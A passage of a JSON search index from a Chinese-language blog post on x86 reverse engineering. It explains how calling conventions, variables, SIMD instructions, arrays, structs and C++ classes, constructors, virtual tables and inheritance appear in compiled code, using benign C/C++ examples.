","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"_cdecl C\\C++默认的调用方式 调用方平栈 参数:从右到左以此入栈 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"_stdcall 被调方平栈 参数:从右到左以此入栈 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"_fastcall 被调方平栈 参数:前两个参数由寄存器传递(VS编译器用edx, ecx),其余参数通过堆栈传递 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"变量相关 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"全局变量 特征 所在地址为数据区,生命周期与所在模块一致. 使用立即数访问. 全局变量初始化 int foo() { return 1234; } int g_nTest = foo(); int main(int argc, char* argv[]) { printf(\"g_nTest = %d\\r\\n\", g_nTest); system(\"pause\"); return 0; } 定位初始化位置 注意:高版本_cinit函数被内联了. 使用交叉引用 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"局部变量 特征 所在地址为栈区,生命周期与所在的函数作用域一致. 使用ebp或esp间接访问. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"局部静态变量 C++语法规定局部静态变量只被初始化一次. int main(int argc, char* argv[]) { static float f = 3.14f / argc; printf(\"f = %f\\r\\n\", f); system(\"pause\"); return 0; } VC6.0Release版 高版本(如VS2019)将这个标志位放到了Tls中. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"堆变量 在C\\C++中,使用malloc与new实现堆空间的申请. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"X87浮点指令集 VC6.0 ~ VS2013. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"特征 使用80位浮点协处理器处理浮点运算. 浮点协处理器内部为栈结构. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"运算过程 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"指令 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"探测浮点标志位 int main(int argc, char* argv[]) { float f = 3.14f / argc; if (f == (float)argc) //ZF = 1 { printf(\"f == (float)argc\\r\\n\"); } else //ZF = 0 { printf(\"f != (float)argc\\r\\n\"); } if (f \u003e 1.23f) //SF = 0 and ZF = 0 { printf(\"f \u003e 1.23f\\r\\n\"); } else //SF = 1 or ZF = 1 { printf(\"f \u003c= 1.23f\\r\\n\"); } if (f \u003c 1.23f) //SF = 1 { printf(\"f \u003c 1.23f\\r\\n\"); } else { printf(\"f \u003e= 1.23f\\r\\n\"); } system(\"pause\"); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"参考资料 Intel奔腾指令速查手册.doc ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:5","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"多媒体指令集 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"MMX VS中使用MMX指令 包含头文件mmintrin.h 特征 有8个64位寄存器(MM0~MM7),借用的是FPU原来的8个80位寄存器(st(0)~st(7)),故使用MMX指令后,需要加上一条EMMS指令,用以复位. 不再使用栈结构. 寄存器在拆分做独立运算时有两种模式. 支持并行计算. 指令 详细查看AMD开发手册(卷5). ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"SSE VS中使用SSE指令 xmmintrin.h //SSE emmintrin.h //SSE2 pmmintrin.h //SSE3 smmintrin.h //SSE4 特征 有8个128位独立寄存器(XMM0~XMM7). 支持并行计算. 指令 详情查看AMD开发手册(卷4). 注意 movaps指令,要求内存地址为模16. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"AVX VS中使用AVX指令 包头文件immintrin.h 特征 扩展之前的8个128位寄存器为8个256位寄存器(YMM0~YMM7). 支持并行计算. 指令 相对于SSE指令语法,前缀加v即可. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"VS中设置多媒体指令集 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:8:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"数组 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"特性 连续性:数组内元素连续排列,且互相不会覆盖. 一致性:具备同类业务功能,即类型和业务功能一样. 注意:身高,体重,年龄都是int类型,但数据功能代表的不一样,这种不属于数组,属于结构体 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"体现数组特性 变量下标访问. 循环访问元素. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"一维数组 int main(int argc, char* argv[]) { int ary[5] = { 0, 1, 2, 3, 4 }; for (int i = 0; i \u003c 5; i++) { printf(\"%d\\r\\n\", ary[i]); } system(\"pause\"); return 0; } Debug Release 高版本(VS2015)Release 数组寻址公式 假设数组为ary[n] ary[x]寻址: 数组首地址 + x * sizeof(type) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"二维数组 int main(int argc, char* argv[]) { int ary[3][5] = { { 1, 2, 3, 4, 5 }, { 10, 20, 30, 40, 50 }, { 100, 200, 300, 400, 500 } }; int x = 0; int y = 0; scanf(\"%d%d\", \u0026x, \u0026y); printf(\"%d\\r\\n\", ary[x][y]); system(\"pause\"); return 0; } Debug Release 数组寻址公式 假设数组为ary[M][N] ary[x][y]寻址 Debug版:ary + x * sizeof(type[N]) + y * sizeof(type) Release版:ary + (x * N + y) * sizeof(type) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"三维数组 int main(int argc, char* argv[]) { int ary[2][3][5] = { { { 1, 2, 3, 4, 5 }, { 10, 20, 30, 40, 50 }, { 100, 200, 300, 400, 500 } }, { { 1, 2, 3, 4, 5 }, { 10, 20, 30, 40, 50 }, { 100, 200, 300, 400, 500 } } }; int x = 0; int y = 0; int z = 0; scanf(\"%d%d%d\", \u0026x, \u0026y, \u0026z); printf(\"%d\\r\\n\", ary[x][y][z]); system(\"pause\"); return 0; } Debug Release 数组寻址公式 假设数组为ary[M][N][K] ar[x][y][z]寻址 Debug版:ary + x * sizeof(type[N][K]) + y * sizeof(type[K]) + z * sizeof(type) Release版:ary + ((x * N + y) * K + z) * sizeof(type) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:9:5","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"结构体 struct tagTest { char szName[5]; // + 0 int n; // + 8 double dbl; // + 16 short int w; // + 24 float f; // + 28 }; // sizeof 32 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"指针访问结构体成员 int main(int argc, char* argv[]) { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; tagTest* p = \u0026t; printf(\"%d\\r\\n\", p-\u003en); system(\"pause\"); return 0; } Debug 特征 会出现寄存器相对间接寻址 出现这种情形,只能是数组常量下标访问或结构成员访问 识别的关键在于论证其中的元素是否具备存储连续性,以及作用是否一致 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"参数为结构体变量 void foo(struct tagTest t) { printf(\"%d\\r\\n\", t.n); } int main(int argc, char* argv[]) { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; foo(t); system(\"pause\"); return 0; } Debug 高版本(VS2019) 会使用多媒体指令集完成,如果结构体足够大,就会使用内联memcpy分方式拷贝到栈上. 特征 会将结构体内容拷贝到栈上 关键语句:mov edi, esp 其实相当于一个内联的memcpy(esp, addr, size) ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"参数为结构体指针 void foo(struct tagTest* pt) { printf(\"%d\\r\\n\", pt-\u003en); } int main(int argc, char* argv[]) { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; foo(\u0026t); system(\"pause\"); return 0; } Debug 特征 访问的时候,会出现寄存器相对间接寻址. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数返回值为结构体 tagTest foo() { tagTest t = { \"Luo\", 1234, 3.14, 12, 0.618f }; return t; } int main(int argc, char* argv[]) { tagTest t2 = foo(); system(\"pause\"); return 0; } Debug 返回值给临时变量,因为我们有可能会访问返回值,如foo().n 特征 多一个参数返回结构体地址 函数退出时,以参数为目标做memcpy复制结构体内容 函数的返回值为参数1 还原 我们按照汇编代码还原,可还原成以下结构 tagTest* GetObj(tagTest* p) { ... ... ... memcpy(p, xxx, xxx); return p; } 此时等价于 tagTest GetObj(); ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:10:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之变量相关 class CLuoTest { public: CLuoTest(); ~CLuoTest(); int IAdd(); void SetVal(int nVal1, int nVal2); private: int m_nVal1; int m_nVal2; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; int CLuoTest::IAdd() { return m_nVal1 + m_nVal2; }; void CLuoTest::SetVal(int nVal1, int nVal2) { m_nVal1 = nVal1; m_nVal2 = nVal2; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"类对象为局部变量 int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(1, 2); int nSum = LuoTest.IAdd(); printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } 识别成员函数 Release 特征 ①第一参数为this指针,默认使用ecx传参. ②函数内对第一参数this指针做间接访问. 注意:如果成员函数为_cdecl或_stdcall调用约定,this指针通过栈传送且为第一参数. 识别构造函数 Release 特征 必要条件: ①必为thiscall调用约定. ②构造函数是该对象进入作用域后的第一次成员函数调用. ③返回this指针. 识别析构函数 Release 特征 必要条件: ①必为thiscall调用约定. ②析构函数是该对象进入作用域后的最后一次成员函数调用. ③无返回值定义. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"类对象为全局变量 CLuoTest g_LuoTest; int main(int argc, char* argv[]) { g_LuoTest.SetVal(1, 2); int nSum = g_LuoTest.IAdd(); printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } 构造函数和析构函数 在__cinit函数的第二个__initterm函数中调用. Release Main函数执行完,会执行atexit注册的函数. 构造函数 析构函数 Debug 在__initterm的函数指针调用. 构造函数 析构函数 总结 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"类对象为堆变量 New单个对象 int main(int argc, char* argv[]) { CLuoTest* pLuoTest = new CLuoTest; pLuoTest-\u003eSetVal(1, 2); int nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); delete pLuoTest; system(\"pause\"); return 0; } Release new delete 注意 new和delete函数会自动检查指针是否为空. 但我们仍然需要自己检查指针是否为空. 因为编译器做的检查,是为了是否执行构造函数或析构函数. 而我们做的检查,是为了让我们在别的地方使用这个指针的时候,指针不为空. Debug new delete 之所以会出现上述代码,是因为我们有可能写出如下代码. int main(int argc, char* argv[]) { CLuoTest* pLuoTest = new CLuoTest; pLuoTest-\u003eSetVal(1, 2); int nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); pLuoTest-\u003e~CLuoTest(); //人工调析构,反复利用同一个空间 pLuoTest-\u003eCLuoTest::CLuoTest(); pLuoTest-\u003eSetVal(10, 20); nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); delete pLuoTest; system(\"pause\"); return 0; } 此时push的参数就会是0,只执行析构函数,不释放空间. New对象数组 int main(int argc, char* argv[]) { CLuoTest* pLuoTest = new CLuoTest[5]; pLuoTest-\u003eSetVal(1, 2); int nSum = pLuoTest-\u003eIAdd(); printf(\"%d\\r\\n\", nSum); delete[] pLuoTest; system(\"pause\"); return 0; } Debug new 这个地方需要析构函数是因为,遇到new失败时,虽然前面的new成功,,但也算整个new对象数组的失败,需要把前面成功new的对象析构掉. detete[] ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:11:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之对象相关 class CLuoTest { public: CLuoTest(); ~CLuoTest(); void Show(); void SetVal(int nVal1, int nVal2); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); }; CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; void CLuoTest::Show() { printf(\"%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); }; void CLuoTest::SetVal(int nVal1, int nVal2) { m_nVal1 = nVal1; m_nVal2 = nVal2; strcpy(m_szName, \"Hun\"); } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"对象传参 void foo(CLuoTest LuoTest) { LuoTest.Show(); } 无拷贝构造 int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(10, 20); foo(LuoTest); system(\"pause\"); return 0; } Release 特征 以栈顶为Dst,对象地址为Src,执行memcpy,浅拷贝. 有拷贝构造 /* //拷贝构造 CLuoTest::CLuoTest(CLuoTest\u0026 Obj) { m_nVal1 = Obj.m_nVal1; m_nVal2 = Obj. m_nVal2; strncpy(m_szName, Obj. m_szName, 20); } */ int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(10, 20); foo(LuoTest); system(\"pause\"); return 0; } Debug Release 特征 ①将栈顶作为this指针给ecx,调用拷贝构造 关键语句:mov ecx, esp ②函数外调用构造函数,函数内调用析构函数 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"对象返回 CLuoTest GetObj() { CLuoTest LuoTest; LuoTest.SetVal(10, 20); return LuoTest; } 拷贝构造 /* //拷贝构造 CLuoTest::CLuoTest(CLuoTest\u0026 obj) { m_nVal1 = obj.m_nVal1; m_nVal2 = obj. m_nVal2; strncpy(m_szName, obj. m_szName, 20); } */ int main(int argc, char* argv[]) { CLuoTest HunTest = GetObj(); //拷贝构造 HunTest.Show(); system(\"pause\"); return 0; } Debug 浅拷贝 int main(int argc, char* argv[]) { CLuoTest HunTest; HunTest = GetObj(); //浅拷贝,产生临时对象 HunTest.Show(); system(\"pause\"); return 0; } Debug 特征 ①调用函数结束后,会执行以返回值为Src,目标对象为Dst的memcpy. ②临时对象,即多传进去的那个参数会执行析构. 无名对象 int main(int argc, char* argv[]) { CLuoTest\u0026 Ref = GetObj(); //产生无名对象,遇到分号不析构,生命周期随Ref Ref.Show(); system(\"pause\"); return 0; } Debug 特征 将返回值给引用. 特征 ①函数多了一个参数. ②函数内构造,函数外析构. ③返回参数1. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"运算符重载 /* //运算符重载 //类内声明为友元函数 friend CLuoTest\u0026 operator+(CLuoTest\u0026 ObjDst, CLuoTest\u0026 ObjSrc); CLuoTest\u0026 operator+(CLuoTest\u0026 ObjDst, CLuoTest\u0026 ObjSrc) { ObjDst.m_nVal1 += ObjSrc.m_nVal1; ObjDst.m_nVal2 += ObjSrc.m_nVal2; return ObjDst; } */ int main(int argc, char* argv[]) { CLuoTest LuoTest; LuoTest.SetVal(10, 20); CLuoTest HunTest; LuoTest = LuoTest + HunTest; //中缀式,实际调用方式为波兰式 LuoTest = operator+(LuoTest, HunTest); LuoTest.Show(); system(\"pause\"); return 0; } Release ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"静态局部 int main(int argc, char* argv[]) { static CLuoTest LuoTest; LuoTest.Show(); system(\"pause\"); return 0; } Release 特征 ①用一个标记来记录静态局部对象是否已初始化. ②若未初始化,则执行构造函数,并注册析构代理. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:12:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之单重继承 class CLuoTest { public: CLuoTest(); CLuoTest::CLuoTest(CLuoTest\u0026 Obj); virtual ~CLuoTest(); virtual void Show(); void SetVal(int nVal1, int nVal2); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CLuoTest::CLuoTest() { m_nVal1 = 10; m_nVal2 = 20; strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); }; CLuoTest::CLuoTest(CLuoTest\u0026 Obj) { m_nVal1 = Obj.m_nVal1; m_nVal2 = Obj.m_nVal2; strncpy(m_szName, Obj.m_szName, 20); } CLuoTest::~CLuoTest() { printf(\"CLuoTest::~CLuoTest\\r\\n\"); }; void CLuoTest::Show() { printf(\"CLuoTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); }; void CLuoTest::SetVal(int nVal1, int nVal2) { m_nVal1 = nVal1; m_nVal2 = nVal2; strcpy(m_szName, \"Hun\"); } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:13:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"虚函数 只有使用对象的指针或引用调用虚函数时,才有访问虚表,间接调用的动作. int main(int argc, char* argv[]) { CLuoTest LuoObj; LuoObj.Show(); CLuoTest\u0026 HunObj = LuoObj; HunObj.Show(); system(\"pause\"); return 0; } 调用方式 Debug 特征 访问虚表,间接调用虚函数. 构造函数 Debug 特征 构造函数会填写虚表,这个地址在只读数据区. 注意:虚表中的函数指针不是0结尾,需通过实际调用,来判断虚函数. 初始化列表 CLuoTest::CLuoTest() :m_nVal1(10), m_nVal2(20) { strcpy(m_szName, \"Luo\"); printf(\"CLuoTest::CLuoTest\\r\\n\"); } Debug 析构函数 Debug 特征 析构函数会回填虚表地址. 注意 为什么析构函数会填写虚表? 假设有类A和类B. B继承A,构造时填写的是B的虚表. 而当B析构完,还需要析构A,但此时this指针中的虚表填写的是B的虚表. 如果此时我们通过虚表间接访问,就会访问到B的函数,但是B已经析构完了. 故需要在析构的时候回填虚表. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:13:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"单重继承有虚函数 class CHunTest : public CLuoTest { public: CHunTest(); virtual ~CHunTest(); virtual void Show(); private: int m_nVal1; int m_nVal2; char m_szName[20]; }; CHunTest::CHunTest() { m_nVal1 = 100; m_nVal2 = 200; strcpy(m_szName, \"Hun\"); printf(\"CHunTest::CHunTest\\r\\n\"); } CHunTest::~CHunTest() { printf(\"CHunTest::~CHunTest\\r\\n\"); } void CHunTest::Show() { printf(\"CHunTest:%d, %d, %s\\r\\n\", m_nVal1, m_nVal2, m_szName); } 构造函数 int main(int argc, char* argv[]) { CLuoTest* pLuoObj = new CHunTest; pLuoObj-\u003eShow(); delete pLuoObj; system(\"pause\"); return 0; } Debug 虚表内容 技巧之交叉引用 查看虚表引用 int main(int argc, char* argv[]) { CLuoTest* pLuoObj = new CHunTest; pLuoObj-\u003eShow(); delete pLuoObj; system(\"pause\"); return 0; } 找到构造函数,识别出虚表地址 右键Xrefs graph to 从这张图中,我们就可以知道构造函数和析构函数. 查看构造函数引用 CHunTest g_HunObj; int main(int argc, char* argv[]) { CHunTest HunObj1; CHunTest HunObj2; CHunTest HunObj3; system(\"pause\"); return 0; } 查看父类构造函数引用 class CHunTest1 : public CLuoTest { }; class CHunTest2 : public CLuoTest { }; class CHunTest3 : public CLuoTest { }; int main(int argc, char* argv[]) { CHunTest HunObj; CHunTest1 HunObj1; CHunTest2 HunObj2; CHunTest3 HunObj3; system(\"pause\"); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:13:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++之对象关系 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:14:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"继承 特征 共用虚表,同一虚表位置写两次. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:14:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"包含 特征 不共用虚表,同一虚表位置写一次. 当红色对象析构时,紫色对象也不在了. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:14:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"聚合 特征 当红色对象析构时,紫色对象可在可不在. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:14:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"注意 当无虚表时,继承和包含无法区分. 